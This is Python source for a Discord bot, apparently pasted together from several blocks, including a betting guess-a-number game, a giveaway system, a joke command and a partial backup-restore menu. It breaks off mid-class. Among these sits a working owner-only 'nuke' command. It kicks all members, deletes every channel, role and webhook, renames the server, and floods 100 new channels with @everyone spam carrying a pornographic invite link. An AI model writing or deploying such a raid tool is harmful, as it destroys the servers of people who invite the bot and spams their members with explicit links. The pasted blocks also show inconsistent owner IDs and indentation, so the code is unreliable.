        modal = PlayerNumberModal(self.opponent_id, self.bet_amount, is_ai=False, opponent_id=self.proposer_id)
        await interaction.response.send_modal(modal)
        await interaction.message.edit(view=self)

class PlayerNumberModal(discord.ui.Modal, title="Pick Your Secret Number"):
    number = discord.ui.TextInput(label="Number (1-100)", placeholder="e.g. 42", required=True)

    def __init__(self, player_id, bet_amount, is_ai=True, opponent_id=None):
        super().__init__()
        self.player_id = player_id
        self.bet_amount = bet_amount
        self.is_ai = is_ai
        self.opponent_id = opponent_id

    async def on_submit(self, interaction: discord.Interaction):
        try:
            secret_number = int(self.number.value.strip())
        except ValueError:
            embed = discord.Embed(description="Please enter a valid number.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if secret_number < 1 or secret_number > 100:
            embed = discord.Embed(description="Number must be between 1 and 100.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if self.is_ai:
            ai_number = random.randint(1, 100)
            guess_number_games[self.player_id] = {
                "player_secret": secret_number,
                "ai_secret": ai_number,
                "player_attempts": 0,
                "ai_attempts": 0,
                "bet": self.bet_amount,
                "opponent": None,
                "is_ai": True,
                "low": 1,
                "high": 100,
                "game_over": False,
                "start_time": time.time(),
                "channel_id": interaction.channel_id
            }
            
            view = GameView(self.player_id, self.bet_amount, is_ai=True, channel_id=interaction.channel_id)
            embed = discord.Embed(
                title="🎮 Guess A Number vs AI",
                description=f"🤖 The AI has chosen a number between **1-100**.\n💰 Bet: **${self.bet_amount:,}**\n⏱️ Time: 3:20 | 🔢 Guesses: 20\n\n👉 **Your turn!** Guess the AI's number!",
                color=discord.Color.blurple()
            )
            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
        else:
            guess_number_games[self.player_id] = {
                "player_secret": secret_number,
                "opponent_secret": None,
                "player_attempts": 0,
                "opponent_attempts": 0,
                "bet": self.bet_amount,
                "opponent": self.opponent_id,
                "is_ai": False,
                "low": 1,
                "high": 100,
                "game_over": False,
                "start_time": time.time(),
                "channel_id": interaction.channel_id
            }
            
            view = GameView(self.player_id, self.bet_amount, is_ai=False, opponent_id=self.opponent_id, channel_id=interaction.channel_id)
            embed = discord.Embed(
                title="🎮 Guess A Number vs Human",
                description=f"<@{self.opponent_id}> has chosen a number between **1-100**.\n💰 Bet: **${self.bet_amount:,}**\n⏱️ Time: 3:20 | 🔢 Guesses: 20\n\n👉 **<@{self.player_id}>'s turn!** Guess the opponent's number!",
                color=discord.Color.blurple()
            )
            await interaction.response.send_message(embed=embed, view=view)

class GameView(discord.ui.View):
    def __init__(self, player_id, bet_amount, is_ai=True, opponent_id=None, channel_id=None):
        super().__init__(timeout=200)
        self.player_id = player_id
        self.bet_amount = bet_amount
        self.is_ai = is_ai
        self.opponent_id = opponent_id
        self.game_over = False
        self.channel_id = channel_id

    async def on_timeout(self):
        if self.game_over:
            return
        guess_number_games.pop(self.player_id, None)
        if self.opponent_id:
            guess_number_games.pop(self.opponent_id, None)

    @discord.ui.button(label="🎯 Make a Guess", style=discord.ButtonStyle.primary)
    async def guess_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        game = guess_number_games.get(self.player_id)
        if not game:
            embed = discord.Embed(description="Game not found!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        elapsed = time.time() - game["start_time"]
        if elapsed > 200:
            self.game_over = True
            embed = discord.Embed(title="⏰ Time's Up!", description="Game ended due to timeout.", color=discord.Color.red())
            guess_number_games.pop(self.player_id, None)
            if self.opponent_id:
                guess_number_games.pop(self.opponent_id, None)
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if game["player_attempts"] >= 20:
            embed = discord.Embed(description="You've used all 20 guesses!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if interaction.user.id != self.player_id:
            embed = discord.Embed(description="This isn't your turn!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        modal = GuessModal(self, self.player_id)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="🛑 Stop Game", style=discord.ButtonStyle.danger)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in (self.player_id, self.opponent_id if self.opponent_id else self.player_id):
            embed = discord.Embed(description="You're not part of this game!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        self.game_over = True
        embed = discord.Embed(
            title="🛑 Game Stopped",
            description=f"{interaction.user.mention} stopped the game.\n\n💰 No money was exchanged. Bets returned.",
            color=discord.Color.orange()
        )
        
        guess_number_games.pop(self.player_id, None)
        if self.opponent_id:
            guess_number_games.pop(self.opponent_id, None)
        
        await interaction.response.edit_message(embed=embed, view=None)

class GuessModal(discord.ui.Modal, title="Enter Your Guess"):
    guess = discord.ui.TextInput(label="Your Guess (1-100)", placeholder="e.g. 50", required=True)

    def __init__(self, game_view, player_id):
        super().__init__()
        self.game_view = game_view
        self.player_id = player_id

    async def on_submit(self, interaction: discord.Interaction):
        try:
            guess_num = int(self.guess.value.strip())
        except ValueError:
            embed = discord.Embed(description="Please enter a valid number.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if guess_num < 1 or guess_num > 100:
            embed = discord.Embed(description="Number must be between 1 and 100.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        game = guess_number_games.get(self.player_id)
        if not game or game["game_over"]:
            return

        elapsed = int(time.time() - game["start_time"])
        remaining_secs = max(0, 200 - elapsed)
        remaining_time = f"{remaining_secs // 60}:{remaining_secs % 60:02d}"

        if self.game_view.is_ai:
            secret = game["ai_secret"]
            game["player_attempts"] += 1

            if guess_num == secret:
                game["game_over"] = True
                update_wallet(self.player_id, self.game_view.bet_amount)
                embed = discord.Embed(
                    title="🎉 Correct!",
                    description=f"<@{self.player_id}> guessed **{guess_num}** and got it **CORRECT**!\n\n🏆 You won!\n💰 Winnings: **${self.game_view.bet_amount:,}**\n📊 Your Attempts: **{game['player_attempts']}**",
                    color=discord.Color.green()
                )
                guess_number_games.pop(self.player_id, None)
                await interaction.response.send_message(embed=embed)
            elif guess_num < secret:
                embed = discord.Embed(
                    description=f"<@{self.player_id}> guessed **{guess_num}** and got it **WRONG**! 📈 Too low!\n\n**Your Attempts: {game['player_attempts']}/20 | ⏱️ {remaining_time}**\n\n👉 **🤖 Bot's turn next!**",
                    color=discord.Color.orange()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                await asyncio.sleep(2)
                await self.bot_guess(interaction, game)
            else:
                embed = discord.Embed(
                    description=f"<@{self.player_id}> guessed **{guess_num}** and got it **WRONG**! 📉 Too high!\n\n**Your Attempts: {game['player_attempts']}/20 | ⏱️ {remaining_time}**\n\n👉 **🤖 Bot's turn next!**",
                    color=discord.Color.orange()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                await asyncio.sleep(2)
                await self.bot_guess(interaction, game)

    async def bot_guess(self, interaction: discord.Interaction, game):
        if game["game_over"] or game["ai_attempts"] >= 20:
            return

        bot_guess = random.randint(1, 100)
        secret = game["player_secret"]
        game["ai_attempts"] += 1

        elapsed = int(time.time() - game["start_time"])
        remaining_secs = max(0, 200 - elapsed)
        remaining_time = f"{remaining_secs // 60}:{remaining_secs % 60:02d}"

        # Send "Bot's turn" message
        turn_embed = discord.Embed(
            description="🤖 **Bot's turn!**",
            color=discord.Color.blurple()
        )
        await interaction.channel.send(embed=turn_embed, ephemeral=True)
        await asyncio.sleep(1)

        if bot_guess == secret:
            game["game_over"] = True
            update_wallet(self.player_id, -self.game_view.bet_amount)
            embed = discord.Embed(
                title="🤖 Bot Guessed Correct!",
                description=f"🤖 Bot guessed **{bot_guess}** and got it **CORRECT**!\n\n🏆 Bot won!\n💰 You lost: **${self.game_view.bet_amount:,}**\n📊 Bot Attempts: **{game['ai_attempts']}**",
                color=discord.Color.red()
            )
            guess_number_games.pop(self.player_id, None)
            await interaction.channel.send(embed=embed, ephemeral=True)
        elif bot_guess < secret:
            embed = discord.Embed(
                description=f"🤖 Bot guessed **{bot_guess}** and got it **WRONG**! 📈 Too low!\n\n**Bot Attempts: {game['ai_attempts']}/20 | ⏱️ {remaining_time}**\n\n👉 **Your turn next!**",
                color=discord.Color.orange()
            )
            await interaction.channel.send(embed=embed, ephemeral=True)
        else:
            embed = discord.Embed(
                description=f"🤖 Bot guessed **{bot_guess}** and got it **WRONG**! 📉 Too high!\n\n**Bot Attempts: {game['ai_attempts']}/20 | ⏱️ {remaining_time}**\n\n👉 **Your turn next!**",
                color=discord.Color.orange()
            )
            await interaction.channel.send(embed=embed, ephemeral=True)

@bot.hybrid_command(name="guess", description="Play Guess A Number for money!")
async def guess(ctx):
    if ctx.author.id in guess_number_games:
        embed = discord.Embed(description="You already have a game running!", color=discord.Color.orange())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    modal = BetModal()
    if ctx.interaction:
        await ctx.interaction.response.send_modal(modal)

class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
    confirm = discord.ui.TextInput(
        label="Type YES to confirm nuke",
        placeholder="YES",
        required=True,
        max_length=3
    )
    kick = discord.ui.TextInput(
        label="Type yes to kick everyone, or no to skip",
        placeholder="yes or no",
        required=True,
        max_length=3
    )

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id not in {1286560808528117820, 1531701933033787416}:
            embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if self.confirm.value.upper() != "YES":
            embed = discord.Embed(
                title="❌ Cancelled",
                description="You did not type YES. Command cancelled.",
                color=discord.Color.red()
            )
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        await interaction.response.defer(ephemeral=True)
        await self.run_nuke(interaction, self.kick.value.lower())

    async def run_nuke(self, interaction: discord.Interaction, kick: str):
        guild = interaction.guild
        if not guild:
            embed = discord.Embed(description="This command can only be used in a server.", color=discord.Color.red())
            return await interaction.followup.send(embed=embed, ephemeral=True)

        me = guild.me
        if not me.guild_permissions.manage_channels or not me.guild_permissions.manage_roles or not me.guild_permissions.manage_webhooks or not me.guild_permissions.manage_guild:
            embed = discord.Embed(
                description="I need Manage Channels, Manage Roles, Manage Webhooks, and Manage Server permissions to nuke.",
                color=discord.Color.red()
            )
            return await interaction.followup.send(embed=embed, ephemeral=True)

        kick_enabled = kick == "yes"
        if kick_enabled and not me.guild_permissions.kick_members:
            embed = discord.Embed(
                description="I need Kick Members permission to kick everyone. Use 'no' to skip kicking.",
                color=discord.Color.red()
            )
            return await interaction.followup.send(embed=embed, ephemeral=True)

        kick_status = "✅ ENABLED - Kicking all members" if kick_enabled else "❌ DISABLED - Skipping kicks"
        
        status_msg = await interaction.followup.send(embed=discord.Embed(
            description=f"☢️ **NUKE INITIATED**\n• Deleting all channels, roles, webhooks...\n• Kick: {kick_status}",
            color=discord.Color.orange()
        ))

        deleted_channels = 0
        deleted_roles = 0
        deleted_webhooks = 0
        created_channels = 0
        kicked_members = 0
        errors = []

        if kick_enabled:
            try:
                for member in guild.members:
                    if member.id == bot.user.id:
                        continue
                    if member.id == interaction.user.id:
                        continue
                    try:
                        await member.kick(reason="Nuke command executed - Server destroyed")
                        kicked_members += 1
                    except Exception as e:
                        errors.append(f"Kick {member.name}: {str(e)[:50]}")
            except Exception as e:
                errors.append(f"Kick all members failed: {str(e)[:50]}")

        try:
            await guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉")
        except Exception as e:
            errors.append(f"Server rename failed: {str(e)[:50]}")

        try:
            webhooks = await guild.fetch_webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete(reason="Nuke command executed")
                    deleted_webhooks += 1
                except Exception as e:
                    errors.append(f"Webhook {webhook.name}: {str(e)[:50]}")
        except Exception as e:
            errors.append(f"Webhook fetch: {str(e)[:50]}")

        try:
            for role in guild.roles:
                if role.id == guild.roles.everyone.id:
                    continue
                try:
                    await role.delete(reason="Nuke command executed")
                    deleted_roles += 1
                except Exception as e:
                    errors.append(f"Role {role.name}: {str(e)[:50]}")
        except Exception as e:
            errors.append(f"Role deletion: {str(e)[:50]}")

        try:
            for channel in guild.channels:
                try:
                    await channel.delete(reason="Nuke command executed")
                    deleted_channels += 1
                except Exception as e:
                    errors.append(f"Channel {channel.name}: {str(e)[:50]}")
        except Exception as e:
            errors.append(f"Channel deletion: {str(e)[:50]}")

        spam_text = """# say gernic 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"""

        async def create_role_and_spam(index):
            try:
                role = await guild.create_role(
                    name="ʂơཞŋ ɬɛҳ",
                    color=discord.Color.from_rgb(255, 0, 0),
                    reason="Nuke command executed"
                )
                channel = await guild.create_text_channel(
                    name=f"𝖌𝖆𝖞𝖘-𝖘𝖊𝖗𝖛𝖊𝖗-𝖌𝖊𝖙𝖘-𝖓𝖚𝖐𝖊𝖉",
                    reason="Nuke command executed"
                )
                try:
                    await interaction.user.add_roles(role, reason="Nuke command executed")
                except:
                    pass
                for _ in range(100):
                    try:
                        await channel.send(
                            f"@everyone\n{spam_text}",
                            allowed_mentions=discord.AllowedMentions(everyone=True)
                        )
                    except Exception:
                        break
                return True
            except Exception:
                return False

        tasks = []
        for i in range(1, 101):
            tasks.append(create_role_and_spam(i))
            if len(tasks) >= 50:
                await asyncio.gather(*tasks, return_exceptions=True)
                created_channels += len(tasks)
                tasks = []

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            created_channels += len(tasks)

        result_embed = discord.Embed(
            title="☢️ NUKE COMPLETE",
            description=(
                f"**Server Renamed to:** S҉i҉g҉g҉a҉ ҉n҉e҉x҉\n\n"
                f"**Kick Option:** {kick_status}\n"
                f"**Members Kicked:** {kicked_members}\n\n"
                f"**Deleted:**\n"
                f"• Channels: {deleted_channels}\n"
                f"• Roles: {deleted_roles}\n"
                f"• Webhooks: {deleted_webhooks}\n\n"
                f"**Created:** {created_channels} channels with 100 pings each.\n"
                f"**Roles Created:** 100 x ʂơཞŋ ɬɛҳ\n\n"
                f"**Nuke executed by:** {interaction.user.mention}"
            ),
            color=discord.Color.red()
        )
        if errors:
            result_embed.add_field(
                name="⚠️ Errors encountered",
                value="\n".join(errors[:5]) + (f"\n... and {len(errors)-5} more" if len(errors) > 5 else ""),
                inline=False
            )

        await status_msg.edit(embed=result_embed)

@bot.tree.command(name="nuke", description="Delete ALL channels, roles, webhooks, and optionally kick ALL members")
async def nuke(interaction: discord.Interaction):
    if interaction.user.id not in {1152424544557088849, 1531701933033787416}:
        embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    await interaction.response.send_modal(NukeModal())
   # ---------- GIVEAWAY (button entry) + REROLL SUPPORT (paste this block) ----------
from typing import List

@bot.hybrid_group(name="giveaway", description="Giveaway commands")
async def giveaway_group(ctx):
    pass

# Persistent entry view (button has a fixed custom_id so we can re-register the view on startup)
class GiveawayEntryView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # persistent view

    @discord.ui.button(label="Enter Giveaway 🎉", style=discord.ButtonStyle.primary, custom_id="giveaway_enter")
    async def enter_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Quick guard
        if interaction.user.bot:
            return await interaction.response.send_message("Bots can't join giveaways.", ephemeral=True)

        # Ack immediately so Discord doesn't show "didn't respond in time"
        try:
            await interaction.response.send_message("✅ You've been entered into the giveaway! Good luck!", ephemeral=True)
        except Exception:
            try:
                await interaction.response.defer(ephemeral=True)
            except Exception:
                pass

        # Do DB work in background to avoid blocking interaction
        async def do_join(message_id: int, user_id: int):
            try:
                cursor.execute("SELECT entrants FROM giveaways WHERE message_id = ?", (message_id,))
                row = cursor.fetchone()
                if not row:
                    return
                try:
                    entrants = json.loads(row[0] or "[]")
                except Exception:
                    entrants = []

                if user_id in entrants:
                    return

                entrants.append(user_id)
                cursor.execute("UPDATE giveaways SET entrants = ? WHERE message_id = ?", (json.dumps(entrants), message_id))
                db.commit()

                # Best-effort: update the giveaway embed Entrants field
                try:
                    # fetch channel id from DB
                    cursor.execute("SELECT channel_id FROM giveaways WHERE message_id = ?", (message_id,))
                    chrow = cursor.fetchone()
                    if chrow:
                        channel_id = chrow[0]
                        channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
                        msg = await channel.fetch_message(message_id)
                        if msg and msg.embeds:
                            embed = msg.embeds[0]
                            found = False
                            for i, f in enumerate(embed.fields):
                                if f.name == "Entrants":
                                    embed.set_field_at(i, name="Entrants", value=str(len(entrants)), inline=True)
                                    found = True
                                    break
                            if not found:
                                embed.add_field(name="Entrants", value=str(len(entrants)), inline=True)
                            await msg.edit(embed=embed, view=self)
                except Exception:
                    pass
            except Exception:
                pass

        # use interaction.message.id as the giveaway message id
        message_id = interaction.message.id if interaction.message else None
        if message_id:
            bot.loop.create_task(do_join(message_id, interaction.user.id))


@giveaway_group.command(name="create", description="Create a giveaway (button entry)")
async def giveaway_create(
    ctx,
    duration: str,
    winners: int,
    prize: str,
    channel: discord.TextChannel = None
):
    """
    duration: e.g. 1h, 30m, 2h, 1d
    winners: number of winners (int)
    prize: prize string
    channel: optional channel (defaults to current channel)
    """
    if ctx.guild is None:
        return await ctx.send(embed=discord.Embed(description="This command must be used in a server.", color=discord.Color.red()))
    if not ctx.author.guild_permissions.manage_guild and ctx.author.id not in OWNER_IDS:
        return await ctx.send(embed=discord.Embed(description="You need Manage Server permission to create giveaways.", color=discord.Color.red()))

    seconds = parse_duration(duration)
    if seconds is None or seconds <= 0:
        return await ctx.send(embed=discord.Embed(description="Invalid duration. Use formats like `30s`, `10m`, `2h`, `1d`.", color=discord.Color.red()))
    if winners < 1:
        return await ctx.send(embed=discord.Embed(description="Winners must be at least 1.", color=discord.Color.red()))
    if winners > 25:
        return await ctx.send(embed=discord.Embed(description="Winners too high (max 25).", color=discord.Color.red()))

    target_channel = channel or ctx.channel
    if target_channel.guild.id != ctx.guild.id:
        return await ctx.send(embed=discord.Embed(description="Channel must be in this server.", color=discord.Color.red()))

    # Ensure giveaways table exists (entrants and winners_list stored as JSON text)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS giveaways (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        message_id INTEGER,
        channel_id INTEGER,
        guild_id INTEGER,
        prize TEXT,
        host_id INTEGER,
        end_time REAL,
        winners INTEGER,
        entrants TEXT DEFAULT '[]',
        winners_list TEXT DEFAULT '[]'
    )
    """)
    db.commit()

    end_ts = int(time.time() + seconds)
    end_ts_discord = f"<t:{end_ts}:R>"

    embed = discord.Embed(
        title=f"🎉 Giveaway: {prize}",
        description=(
            f"Hosted by: {ctx.author.mention}\n"
            f"Ends: {end_ts_discord}\n"
            f"Winners: **{winners}**\n\n"
            "Click the button below to enter!"
        ),
        color=discord.Color.gold()
    )
    embed.set_footer(text=f"Giveaway created by {ctx.author.display_name}")

    try:
        view = GiveawayEntryView()
        giveaway_msg = await target_channel.send(embed=embed, view=view)
    except Exception as e:
        return await ctx.send(embed=discord.Embed(description=f"Failed to post giveaway: {e}", color=discord.Color.red()))

    # Persist giveaway (store host_id; entrants/winners_list empty)
    cursor.execute(
        "INSERT INTO giveaways (message_id, channel_id, guild_id, prize, host_id, end_time, winners, entrants, winners_list) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
        (giveaway_msg.id, target_channel.id, ctx.guild.id, prize, ctx.author.id, end_ts, winners, json.dumps([]), json.dumps([]))
    )
    db.commit()

    # Add Entrants field to embed
    try:
        embed.add_field(name="Entrants", value="0", inline=True)
        await giveaway_msg.edit(embed=embed, view=view)
    except Exception:
        pass

    confirm = discord.Embed(description=f"🎉 Giveaway created in {target_channel.mention} and will end {end_ts_discord}.", color=discord.Color.green())
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=confirm, ephemeral=True)
    else:
        await ctx.send(embed=confirm, delete_after=10)

    # Spawn background task (pass host id)
    bot.loop.create_task(_handle_giveaway_end(giveaway_msg.id, target_channel.id, ctx.guild.id, prize, winners, end_ts, ctx.author.id))


async def _handle_giveaway_end(message_id: int, channel_id: int, guild_id: int, prize: str, winners_count: int, end_time_unix: int, host_id: int):
    # Sleep until giveaway end (handles negative/late cases)
    wait_for = max(0, end_time_unix - int(time.time()))
    await asyncio.sleep(wait_for)

    # Try to fetch channel and message
    try:
        channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
    except Exception:
        return

    try:
        message = await channel.fetch_message(message_id)
    except Exception:
        return

    # Load entrants from DB
    cursor.execute("SELECT entrants, winners_list FROM giveaways WHERE message_id = ?", (message_id,))
    row = cursor.fetchone()
    entrants: List[int] = []
    previous_winners: List[int] = []
    if row:
        try:
            entrants = json.loads(row[0] or "[]")
        except Exception:
            entrants = []
        try:
            previous_winners = json.loads(row[1] or "[]")
        except Exception:
            previous_winners = []

    # Decide winners
    winner_mentions = "None"
    winners = []
    if not entrants:
        result_embed = discord.Embed(title="🎉 Giveaway Ended", description=f"No valid entrants for **{prize}**. No winners were chosen.", color=discord.Color.orange())
        await channel.send(embed=result_embed)
    else:
        pick_count = min(winners_count, len(entrants))
        winners = random.sample(entrants, k=pick_count)
        winner_mentions = ", ".join(f"<@{w}>" for w in winners)

        # Record winners (overwrite winners_list to current winners)
        cursor.execute("UPDATE giveaways SET winners_list = ? WHERE message_id = ?", (json.dumps(winners), message_id))
        db.commit()

        result_embed = discord.Embed(
            title="🎉 Giveaway Ended — Congratulations!",
            description=f"{winner_mentions} won the giveaway of **{prize}**!",
            color=discord.Color.green()
        )
        result_embed.add_field(name="Host", value=f"<@{host_id}>", inline=True)
        result_embed.add_field(name="Entrants", value=str(len(entrants)), inline=True)

        # DM winners with requested message
        for uid in winners:
            try:
                user = await bot.fetch_user(uid)
                dm_text = f"congrats {user.mention} u won the giveaway **{prize}** in **{channel.guild.name}** pls check the server or ping the host <@{host_id}> in the server to claim ur giveaway!"
                await user.send(dm_text)
            except Exception:
                pass

        await channel.send(embed=result_embed)

    # Edit original giveaway message to mark ended and disable the button
    try:
        if message.embeds:
            ended_embed = message.embeds[0]
            ended_embed.title = f"🎉 Giveaway (ENDED): {prize}"
            ended_embed.color = discord.Color.dark_gray()
            ended_embed.set_footer(text="This giveaway has ended.")
            ended_embed.description = (ended_embed.description or "") + f"\n\nWinners: {winner_mentions}"
            await message.edit(embed=ended_embed, view=None)
    except Exception:
        pass

    # Do NOT delete DB row so host can reroll later. If you want auto-delete, uncomment the lines below:
    # cursor.execute("DELETE FROM giveaways WHERE message_id = ?", (message_id,))
    # db.commit()


@giveaway_group.command(name="reroll", description="Reroll winners for a giveaway by message ID (host only)")
async def giveaway_reroll(ctx, message_id: int, count: int = 1):
    """
    Example: ,,giveaway reroll 123456789012345678 1
    Only the host or bot owners can reroll.
    count: how many new winners to pick (default 1)
    """
    cursor.execute("SELECT channel_id, prize, host_id, entrants, winners_list FROM giveaways WHERE message_id = ?", (message_id,))
    row = cursor.fetchone()
    if not row:
        return await ctx.send(embed=discord.Embed(description="Could not find a giveaway with that message ID.", color=discord.Color.red()))

    channel_id, prize, host_id, entrants_json, winners_json = row
    if ctx.author.id != host_id and ctx.author.id not in OWNER_IDS:
        return await ctx.send(embed=discord.Embed(description="Only the giveaway host or bot owners can reroll this giveaway.", color=discord.Color.red()))

    try:
        entrants = json.loads(entrants_json or "[]")
    except Exception:
        entrants = []
    try:
        previous_winners = json.loads(winners_json or "[]")
    except Exception:
        previous_winners = []

    if not entrants:
        return await ctx.send(embed=discord.Embed(description="No entrants to pick from.", color=discord.Color.orange()))

    # Build pool excluding previous winners if possible
    pool = [u for u in entrants if u not in previous_winners]
    if not pool:
        pool = entrants.copy()

    pick_count = max(1, min(count, len(pool)))
    new_winners = random.sample(pool, k=pick_count)

    # Update winners_list (append new winners to previous list)
    updated_winners = previous_winners + new_winners
    cursor.execute("UPDATE giveaways SET winners_list = ? WHERE message_id = ?", (json.dumps(updated_winners), message_id))
    db.commit()

    # Announce new winner(s) in original channel and DM them
    try:
        channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
        mentions = ", ".join(f"<@{w}>" for w in new_winners)
        if len(new_winners) == 1:
            title = "🎉 Reroll — New Winner!"
            desc = f"Congrats — new winner of **{prize}** is {mentions}!"
        else:
            title = "🎉 Reroll — New Winners!"
            desc = f"Congrats — new winners of **{prize}** are {mentions}!"

        reroll_embed = discord.Embed(title=title, description=desc, color=discord.Color.green())
        reroll_embed.add_field(name="Host", value=f"<@{host_id}>", inline=True)
        reroll_embed.set_footer(text=f"Rerolled by {ctx.author.display_name}")

        await channel.send(embed=reroll_embed)

        # DM each new winner with the requested DM format
        for uid in new_winners:
            try:
                user = await bot.fetch_user(uid)
                dm_text = f"congrats {user.mention} u won the giveaway **{prize}** in **{channel.guild.name}** pls check the server or ping the host <@{host_id}> in the server to claim ur giveaway!"
                await user.send(dm_text)
            except Exception:
                pass

        # Also append reroll winners to original giveaway message (best-effort)
        try:
            original_msg = await channel.fetch_message(message_id)
            if original_msg and original_msg.embeds:
                ed = original_msg.embeds[0]
                ed.description = (ed.description or "") + f"\n\nReroll winners: {mentions}"
                await original_msg.edit(embed=ed)
        except Exception:
            pass

        await ctx.send(embed=discord.Embed(description=f"Rerolled — new winner(s): {mentions}", color=discord.Color.green()))
    except Exception as e:
        await ctx.send(embed=discord.Embed(description=f"Failed to announce reroll: {e}", color=discord.Color.red()))
# ---------- END GIVEAWAY BLOCK ----------

# =========================================================
# SYNC COMMAND - FIX SLASH COMMANDS
# =========================================================

@bot.hybrid_command(name="sync", description="Force sync slash commands")
async def sync(ctx):
    if ctx.author.id not in {1152424544557088849, 1531701933033787416}:
        return await ctx.send("❌ Only bot owners can use this.")
    
    try:
        await bot.tree.sync()
        await ctx.send("✅ Slash commands synced globally! Try `/goon` now.")
    except Exception as e:
        await ctx.send(f"❌ Sync failed: {e}")

# =========================================================
# GOON COMMAND
# =========================================================

@bot.hybrid_command(name="goon", description="Goon on someone as a joke!")
async def goon(ctx, member: discord.Member):
    author = ctx.author
    target = member

    if author.id == target.id:
        response_text = f"{author.mention} tried to goon to themselves but that's too weird... so they gooned to the air instead! 🫠"
    else:
        response_text = f"{author.mention} gooned to {target.mention} and felt amazing!"

    embed = discord.Embed(
        description=response_text,
        color=discord.Color.purple()
    )
    embed.set_image(url="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZTA3c3Jwd2pxa2VrdGZneHVpd3JueWlyeDY5c2RsNDVkZnlzZm5lZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/pWDC0SjDvj5mHd00Lx/giphy.gif")

    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except:
                pass
        await ctx.send(embed=embed)
      # =========================================================
# ADVANCED FREE SERVER BACKUP & RESTORE SYSTEM
# =========================================================

import io
import json
import discord
from discord.ext import commands
from discord.ui import View, Select

server_backups = {}

# --- VIEW CLASSES FOR INTERACTIVE MENUS ---

class RestoreSelectView(View):
    def __init__(self, ctx, backup_data):
        super().__init__(timeout=180)
        self.ctx = ctx
        self.backup_data = backup_data
        self.selected_options = ["Delete Roles", "Delete Channels", "Load Roles", "Load Channels", "Load Settings", "Load Messages"]

        # Add interactive dropdown matching the layout in your screenshots
        self.select = Select(
            placeholder="Select options to load from backup...",
            min_values=1,
            max_values=6,
            options=[
                discord.SelectOption(label="Delete Roles", value="Delete Roles", default=True, description="Wipes current non-managed roles"),
                discord.SelectOption(label="Delete Channels", value="Delete Channels", default=True, description="Wipes current server channels"),
                discord.SelectOption(label="Load Roles", value="Load Roles", default=True, description="Recreates roles with exact permissions & colors"),
                discord.SelectOption(label="Load Channels", value="Load Channels", default=True, description="Recreates categories, text, and voice channels"),
                discord.SelectOption(label="Load Settings", value="Load Settings", default=True, description="Restores server name, icon, and region settings"),
                discord.SelectOption(label="Load Messages", value="Load Messages", default=True, description="Restores backed-up messages into channels")
            ]
        )
        self.select.callback = self.select_callback
        self.add_item(self.select)

    async def select_callback(self, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            return await interaction.response.send_message("This menu isn't for you!", ephemeral=True)
        self.selected_options = self.select.values
        await interaction.response.defer()

    @discord.ui.button(label="Continue", style=discord.ButtonStyle.green)
    async def continue_button(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.user != self.ctx.author:
            return await interaction.response.send_message("This menu isn't for you!", ephemeral=True)
        
        # Move to confirmation step view
        confirm_view = ConfirmRestoreView(self.ctx, self.backup_data, self.selected_options)
        
        roles_up = "will be updated" if "Load Roles" in self.selected_options else "will be skipped"
        ch_del = len(self.ctx.guild.channels) if "Delete Channels" in self.selected_options else 0
        ch_cre = len(self.backup_data["channels"]) if "Load Channels" in self.selected_options else 0

        embed = discord.Embed(
            title="⚠️ Warning",
            description=(
                "**Hey, be careful!** The following actions will be taken on this server and **can not be undone**:\n\n"
                f"• **1** roles {roles_up}\n"
                f"• **{ch_del}** channels will be **deleted**\n"
                f"• **{ch_cre}** channels will be created\n"
                f"• Server settings will {'be updated' if 'Load Settings' in self.selected_options else 'remain unchanged'}"
            ),
            color=discord.Color.gold()
        )
        await interaction.response.edit_message(embed=embed, view=confirm_view)

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.user != self.ctx.author:
            return await interaction.response.send_message("This menu isn't for you!", ephemeral=True)
        embed = discord.Embed(title="❌ Restore Cancelled", description="Server restoration was aborted safely.", color=discord.Color.red())
